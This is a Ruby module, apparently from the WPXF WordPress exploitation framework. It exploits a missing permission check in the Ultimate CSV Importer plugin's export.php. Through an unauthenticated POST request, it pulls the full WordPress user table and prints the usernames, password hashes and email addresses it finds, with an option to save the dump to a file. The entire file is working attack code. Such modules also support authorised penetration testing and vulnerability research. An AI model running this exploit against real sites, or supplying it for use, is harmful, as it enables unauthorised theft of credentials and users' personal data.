require 'csv'

class Wpxf::Auxiliary::UltimateCsvImporterUserExtract < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient

  def initialize
    super

    update_info(
      name: 'Ultimate CSV Importer User Table Extract',
      desc: %(
        Due to lack of verification of a visitor's permissions, it is
        possible to execute the 'export.php' script included in the
        default installation of the Ultimate CSV Importer plugin and
        retrieve the full contents of the user table in the WordPress
        installation. This results in full disclosure of usernames,
        hashed passwords and email addresses for all users.
      ),
      author: [
        'James Hooker',                    # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '7778']
      ],
      date: 'Feb 02 2015'
    )

    register_options([
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the export to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('wp-ultimate-csv-importer', '3.6.7', '3.6.0')
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def plugin_url
    normalize_uri(wordpress_url_plugins, 'wp-ultimate-csv-importer')
  end

  def exporter_url
    normalize_uri(plugin_url, 'modules', 'export', 'templates', 'export.php')
  end

  def payload_body
    builder = Utility::BodyBuilder.new
    builder.add_field('export', 'users')
    builder.create do |body|
      return body
    end
  end

  def process_row(row)
    if row[:user_login] && row[:user_pass]
      emit_success "Found credential: #{row[:user_login]}:#{row[:user_pass]}", true
      @credentials.push({
          username: row[:user_login],
          password: row[:user_pass],
          email: row[:user_email]
      })
    end
  end

  def parse_csv(body, delimiter)
    begin
      CSV::Converters[:blank_to_nil] = lambda do |field|
        field && field.empty? ? nil : field
      end
      csv = CSV.new(
        body,
        :col_sep => delimiter,
        :headers => true,
        :header_converters => :symbol,
        :converters => [:all, :blank_to_nil]
      )
      csv.to_a.map { |row| process_row(row) }
      return true
    rescue
      return false
    end
  end

  def run
    return false unless super

    @credentials = [{
      username: 'Username', password: 'Password Hash', email: 'E-mail'
    }]

    emit_info 'Requesting CSV extract...'
    res = execute_post_request(url: exporter_url, body: payload_body)

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_info 'Parsing response...'
    unless parse_csv(res.body, ',') || parse_csv(res.body, ';')
      emit_error 'Failed to parse response, the CSV was invalid'
      emit_info "CSV content: #{res.body}", true
      return false
    end

    emit_table @credentials

    if export_path
      emit_info 'Saving export...'
      File.open(export_path, 'w') { |file| file.write(res.body) }
      emit_success "Saved export to #{export_path}"
    end

    true
  end
end
